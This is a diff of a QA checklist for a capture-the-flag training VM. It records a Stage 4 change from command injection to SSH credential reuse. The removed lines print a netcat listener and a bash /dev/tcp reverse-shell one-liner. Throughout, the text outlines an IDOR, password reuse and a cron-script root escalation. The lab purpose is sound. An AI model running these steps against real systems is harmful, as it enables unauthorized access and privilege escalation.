@@ -5,6 +5,13 @@
 > inferred from earlier phases' notes, though several checks had also
 > been run during Phases 3–5 and are re-confirmed here. Nothing is
 > marked PASS without observed output.
+>
+> **Revision note:** Stage 4's mechanism later changed from command
+> injection + reverse shell to credential reuse + direct SSH (decoys
+> also reduced from 10 to 5, one per stage). Rows C2, G3, G4, and
+> Section E below are updated to the current mechanism, each with
+> fresh evidence from re-running the full chain after that change —
+> not left describing a feature that no longer exists.
 
 Legend: **PASS** (run, observed correct) / **FAIL** (run, observed
 incorrect) / **UNTESTED** (not run, with reason).
@@ -31,7 +38,7 @@ incorrect) / **UNTESTED** (not run, with reason).
 | # | Check | Result | Evidence |
 |---|---|---|---|
 | C1 | Web identities are distinct from Linux identities | PASS | Web: `john`(not admin)/`admin`(admin) in the app DB. Linux: `john`(uid 1001), `admin`(uid 1002, gid 110), `ctfbuilder`(uid 1000), `root` disabled. Confirmed via `getent passwd`. |
-| C2 | The admin function executes with the Linux admin identity | PASS | Live command injection via `/admin/diagnostics` (fresh run this session) wrote `id > /tmp/fa_t7_proof.txt`; file contents: `uid=1002(admin) gid=110(admin) groups=110(admin)`. Separately, a literal netcat reverse shell was caught over the real VM networking path (see "Reverse shell" row in Section G). |
+| C2 | The credential-reuse pivot lands in the Linux admin identity | PASS | Real SSH password login (`ssh admin@<vm>` with the IDOR-disclosed password, no key) → `id` → `uid=1002(admin) gid=110(admin) groups=110(admin)`. |
 | C3 | It does not execute as root | PASS | Same evidence — `uid=1002`, not `0` |
 
 ## D. File permissions
@@ -47,10 +54,10 @@ incorrect) / **UNTESTED** (not run, with reason).
 | # | Check | Result | Evidence |
 |---|---|---|---|
 | E1 | Exactly 5 genuine flags exist | PASS | `validate-flags.sh`: "exactly 5 genuine flags (5)" |
-| E2 | Exactly 10 decoys exist | PASS | "exactly 10 decoy flags (10)" |
+| E2 | Exactly 5 decoys exist (revised from 10, one per stage) | PASS | "exactly 5 decoy flags (5)" |
 | E3 | 3 genuine flags encrypted | PASS | "3 genuine flags encrypted (3)" (spec says "three genuine flags are encrypted" in Section 21.E — matches our distribution of flags 3/4/5) |
-| E4 | 5 decoys encrypted | PASS | "5 decoy flags encrypted (5)" |
-| E5 | All flag values are unique | PASS | "all 15 flag values are unique" |
+| E4 | 3 decoys encrypted (revised from 5) | PASS | "3 decoy flags encrypted (3)" |
+| E5 | All flag values are unique | PASS | "all 10 flag values are unique" |
 | E6 | Only genuine flags receive points | PASS | Functionally tested the scoring snippet from `scoring-guide.md` with a genuine flag (→ 100 pts), a decoy (→ 0 pts), and an unrecognized string (→ not recognized) — all three behaved correctly |
 
 ## F. Final artifact
@@ -68,19 +75,19 @@ incorrect) / **UNTESTED** (not run, with reason).
 |---|---|---|---|
 | G1 | The intended path is documented and manually testable | PASS | `instructor-material/solution-walkthrough.md`; every step in it has been executed for real at least once across Phases 3–7 |
 | G2 | Every stage has a reproducible starting state | PASS | App/DB: `A4` above. Privesc mechanism: `reset-privesc.sh`, tested in Phase 5 (re-exploit → reset → clean). Whole VM: this phase, deliberately deleted a flag file and stopped the app service, took a `qemu-img snapshot`, restored it, and confirmed both were back exactly as before, plus the privesc weakness and no leftover artifacts. The resulting `clean-start` snapshot is now the VM's checked-in baseline for resetting between teams (see `reset-guide.md`). |
-| G3 | No accidental shortcut makes an earlier stage unnecessary | PASS (checked, not proven exhaustively) | SSH password auth is disabled for every account (only `ctfbuilder`'s key works) — players cannot skip straight to a shell. The admin web password and the final artifact's password are both high-entropy/arbitrary strings, not guessable or derivable without the intended discovery steps. No other route in the Flask app skips authentication. This is a reasoned check of the implemented surface, not an exhaustive penetration test of every conceivable shortcut. |
-| G4 | Reverse-shell workflow works over the actual VM networking, not just a `sudo` proxy | PASS | From the host, started `nc -lvnp 4444`; via `/admin/diagnostics`'s command injection, ran `bash -i >& /dev/tcp/10.0.2.2/4444 0>&1` (the documented SLIRP gateway address from `vm/networking.md`, not `127.0.0.1`). Listener log: `Connection received on 127.0.0.1 36262` → shell prompt `admin@forgotten-admin:/opt/forgotten-admin/app$`. Confirms the documented host/guest IP distinction is correct and the reverse-shell path genuinely works end to end, not merely the underlying command-execution primitive. |
+| G3 | No accidental shortcut makes an earlier stage unnecessary | PASS (checked, not proven exhaustively) | SSH password auth is scoped to `admin` only via an sshd `Match User admin` block (confirmed: `john` → `Permission denied (publickey)` trying the same password route) — players can't reach a shell without first finding `admin`'s password through the IDOR. That password and the final artifact's password are both high-entropy/arbitrary strings, not guessable. No other route in the Flask app skips authentication. This is a reasoned check of the implemented surface, not an exhaustive penetration test of every conceivable shortcut. |
+| G4 | Stage 4's credential-reuse pivot works as a real SSH session, not just a `sudo` proxy | PASS | `ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no admin@127.0.0.1` with the IDOR-disclosed password → real interactive shell, `id` → `uid=1002(admin)`. Ran the full chain through this exact session: read `decrypt_notes.txt`, decrypted Flag 4, appended the privesc payload to `cleanup.sh`, waited for the real cron tick, got `euid=0`, decrypted `/root/final_evidence.enc` with Flag 3's plaintext → Flag 5. No instructor `sudo` anywhere in this run. |
 
 ## Full end-to-end chain — run live, start to finish, in this project (cumulative across Phases 3-7)
 
 OSINT (Flag 1) → metadata (Flag 2) → git history/crypto (Flag 3,
 plaintext retained) → web login as `john` → IDOR on `/records/2` →
-admin web credential → command injection as Linux `admin`, confirmed
-both via direct proof-file writes and a real netcat reverse shell over
-the documented VM networking path → decrypt Flag 4 on-box → enumerate
-`/etc/cron.d/` → exploit the group-writable cron script → genuine
-`euid=0` → decrypt `/root/final_evidence.enc` with Flag 3's plaintext →
-Flag 5. All five genuine flags recovered this way; several decoys also
+admin password disclosed → real SSH password login as Linux `admin`
+with that same password (no key, no command injection) → decrypt
+Flag 4 on-box → enumerate `/etc/cron.d/` → exploit the group-writable
+cron script → genuine `euid=0` → decrypt `/root/final_evidence.enc`
+with Flag 3's plaintext → Flag 5. All five genuine flags recovered
+this way, in one continuous SSH session; all five decoys also
 recovered and confirmed to award 0 points.
 
 ## Known limitations (stated, not hidden)
